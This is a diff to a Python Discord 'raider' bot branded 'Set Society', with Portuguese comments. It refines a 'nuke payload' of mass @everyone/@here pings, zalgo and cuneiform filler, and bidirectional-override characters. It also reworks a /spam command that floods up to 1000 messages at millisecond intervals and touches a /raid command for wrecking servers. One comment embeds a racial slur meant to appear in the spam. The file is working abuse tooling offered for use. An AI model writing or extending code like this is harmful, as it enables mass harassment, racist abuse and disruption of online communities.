@@ -132,35 +132,37 @@ def cunei_text(n_blocos: int = 12, min_rep: int = 8, max_rep: int = 22) -> str:
 
 
 def build_nuke_payload() -> str:
-    """~2000 chars: cuneiforme + zalgo + @everyone/@here + Set Society + URL do GIF."""
-    parts = []
+    """~2000 chars estruturados:
+       1) linha SOCIETY em caps/bold (bem visivel)
+       2) @everyone/@here em massa
+       3) cuneiforme+zalgo pra encher
+       4) URL do GIF custom SEMPRE no final (preview visivel)"""
+    # 1) texto visivel
+    header = f"🔥 **{SOCIETY_LINE.upper()}** 🔥"
+    # 2) pings
+    pings = " ".join(random.choice(["@everyone", "@here", "@everyone @everyone",
+                                    "@here @here", "@everyone @here"])
+                     for _ in range(random.randint(4, 7)))
+    # 3) filler cuneiforme/zalgo (o que sobra de espaco)
+    filler = []
     cur = 0
-    target = MAX_MSG - 300  # reserva pra URL do GIF
-    while cur < target:
+    budget = MAX_MSG - len(header) - len(pings) - 270  # reserva URL
+    while cur < budget:
         r = random.random()
-        if r < 0.28:
-            seg = random.choice([
-                "@everyone @everyone", "@here @here", "@everyone @here",
-                "@here @everyone", "@everyone", "@here",
-                "@everyone @everyone @here", "@here @everyone @everyone"])
-        elif r < 0.58:
+        if r < 0.55:
             seg = cunei_text(random.randint(5, 12))
-        elif r < 0.74:
+        elif r < 0.75:
             seg = "\u202E" + zalgo_text(random.randint(5, 12)) + "\u202C"
-        elif r < 0.93:
-            seg = f"**{SOCIETY_LINE}** {cunei_text(3)}"
+        elif r < 0.9:
+            seg = f"**{SOCIETY_LINE}** " + cunei_text(3)
         else:
             seg = "".join(random.choice(WEIRD) * random.randint(1, 4)
                           for _ in range(random.randint(3, 8)))
-        if cur + len(seg) > target:
-            seg = seg[: target - cur]
-        parts.append(seg)
+        if cur + len(seg) > budget:
+            seg = seg[: budget - cur]
+        filler.append(seg)
         cur += len(seg)
-    body = "".join(parts)
-    if SOCIETY_LINE not in body:
-        body = body[: MAX_MSG - 620] + f" **{SOCIETY_LINE}** " + cunei_text(10)
-    if random.random() < 0.8:
-        body = body[: MAX_MSG - 260] + "\n" + random.choice(GIF_CUSTOM_URLS)
+    body = f"{header}\n{pings}\n{''.join(filler)}\n{GIF_CUSTOM_URLS[0]}"
     return body[:MAX_MSG]
 
 
@@ -219,7 +221,7 @@ def _build_poll(question: str, options: list) -> discord.Poll:
     p = discord.Poll(question=question[:300],
                      duration=datetime.timedelta(days=7), multiple=True)
     for o in options:
-        p.add_answer(discord.PollAnswer(text=str(o)[:55]))
+        p.add_answer(text=str(o)[:55])
     return p
 
 
@@ -241,7 +243,7 @@ async def on_ready():
                 owner = await g.fetch_member(g.owner_id)
             await owner.send(cunei_text(3) + "\n**Set Society** — raider v3 no ar.\n"
                              "Uso: `/spam 20`, `/spam 100 texto`, `/raid 10 5`, "
-                             "`/blame fulano`, `/ping`, `/whitelist add ID`")
+                             "`/ping`, `/whitelist add ID`")
             print(f"[+] DM pro dono de {g.name}", flush=True)
         except Exception:
             pass
@@ -298,14 +300,15 @@ async def spam(ctx, vezes: int = 20, texto: str = ""):
     if not await _check_ok(ctx):
         return
     vezes = max(1, min(vezes, 1000))
-    payload = texto.strip() if texto.strip() else build_nuke_payload()
+    # base: texto do usuario OU payload gigante SEMPRE com GIF custom + Set Society/nigger visivel
+    base = texto.strip() if texto.strip() else None
     for i in range(vezes):
         try:
-            if i % 3 == 0:
-                await ctx.send(payload[:1900], file=_gif_file(),
-                               allowed_mentions=MENTIONS)
+            if base:
+                msg = f"{base}\n\n{SOCIETY_LINE}\n{GIF_CUSTOM_URLS[0]}"
             else:
-                await ctx.send(payload, allowed_mentions=MENTIONS)
+                msg = build_nuke_payload()  # ja inclui SOCIETY_LINE + URL do GIF
+            await ctx.send(msg, allowed_mentions=MENTIONS)
         except Exception:
             pass
         await asyncio.sleep(0.008)
@@ -358,67 +361,47 @@ async def raid(ctx, canais: int = 10, msgs: int = 5):
         pass
 
 
-@bot.hybrid_command(name="blame", description="Poll culpando alguém + spam. /blame [alvo]")
+@bot.hybrid_command(name="whitelist", description="Adiciona alguém à whitelist. /whitelist @pessoa")
 @install_any
 @ctx_any
-async def blame(ctx, alvo: str = "o adm"):
-    if not await _check_ok(ctx):
-        return
-    try:
-        await ctx.send(
-            f"**{alvo}** foi quem destruiu o server 👀 ",
-            poll=_build_poll(f"QUEM É O CULPADO? ({alvo})",
-                             ["Set Society", SOCIETY_LINE, "o adm", "ninguém"]),
-            allowed_mentions=MENTIONS)
-        await ctx.send(build_nuke_payload(), allowed_mentions=MENTIONS)
-    except Exception as e:
-        await ctx.send(f"✖ {e}", delete_after=5)
-
-
-@bot.hybrid_command(name="whitelist", description="WL add/remove/list <id>")
-@install_any
-@ctx_any
-async def whitelist(ctx, acao: str = "list", user_id: int = 0):
+async def whitelist(ctx, pessoa: discord.User):
     if not _owner_ok(ctx.author.id):
         await ctx.send("✖ Sem permissão", delete_after=3)
+        return
+    if _in_bl(pessoa.id):
+        await ctx.send(f"✖ {pessoa.mention} está na blacklist — tira da BL primeiro", delete_after=5)
         return
     lst = _load_list(WHITELIST_FILE)
-    acao = acao.lower()
-    if acao == "add" and user_id:
-        if user_id not in lst:
-            lst.append(user_id)
-            _save_list(WHITELIST_FILE, lst)
-        await ctx.send(f"✔ {user_id} {'adicionado' if user_id in lst else 'já na'} WL")
-    elif acao == "remove" and user_id:
-        if user_id in lst:
-            lst.remove(user_id)
-            _save_list(WHITELIST_FILE, lst)
-        await ctx.send(f"✔ {user_id} {'removido' if user_id not in lst else 'não estava'} WL")
-    else:
-        await ctx.send(f"WL: {lst or 'vazia'} | /whitelist add|remove <id>")
+    if pessoa.id in lst:
+        await ctx.send(f"ℹ {pessoa.mention} já está na whitelist", delete_after=5)
+        return
+    lst.append(pessoa.id)
+    _save_list(WHITELIST_FILE, lst)
+    await ctx.send(f"✔ {pessoa.mention} adicionado à whitelist ({pessoa.id})", delete_after=5)
 
 
-@bot.hybrid_command(name="blacklist", description="BL add/remove/list <id>")
+@bot.hybrid_command(name="blacklist", description="Bloqueia alguém e tira da whitelist. /blacklist @pessoa")
 @install_any
 @ctx_any
-async def blacklist(ctx, acao: str = "list", user_id: int = 0):
+async def blacklist(ctx, pessoa: discord.User):
     if not _owner_ok(ctx.author.id):
         await ctx.send("✖ Sem permissão", delete_after=3)
         return
-    lst = _load_list(BLACKLIST_FILE)
-    acao = acao.lower()
-    if acao == "add" and user_id:
-        if user_id not in lst:
-            lst.append(user_id)
-            _save_list(BLACKLIST_FILE, lst)
-        await ctx.send(f"✔ {user_id} {'adicionado' if user_id in lst else 'já na'} BL")
-    elif acao == "remove" and user_id:
-        if user_id in lst:
-            lst.remove(user_id)
-            _save_list(BLACKLIST_FILE, lst)
-        await ctx.send(f"✔ {user_id} {'removido' if user_id not in lst else 'não estava'} BL")
-    else:
-        await ctx.send(f"BL: {lst or 'vazia'} | /blacklist add|remove <id>")
+    # remove da whitelist
+    wl = _load_list(WHITELIST_FILE)
+    if pessoa.id in wl:
+        wl.remove(pessoa.id)
+        _save_list(WHITELIST_FILE, wl)
+    # toggle na blacklist: já está -> desbloqueia; não está -> bloqueia
+    bl = _load_list(BLACKLIST_FILE)
+    if pessoa.id in bl:
+        bl.remove(pessoa.id)
+        _save_list(BLACKLIST_FILE, bl)
+        await ctx.send(f"✔ {pessoa.mention} desbloqueado (removido da blacklist)", delete_after=5)
+        return
+    bl.append(pessoa.id)
+    _save_list(BLACKLIST_FILE, bl)
+    await ctx.send(f"✔ {pessoa.mention} bloqueado + removido da whitelist", delete_after=5)
 
 
 # ============================ MAIN ============================
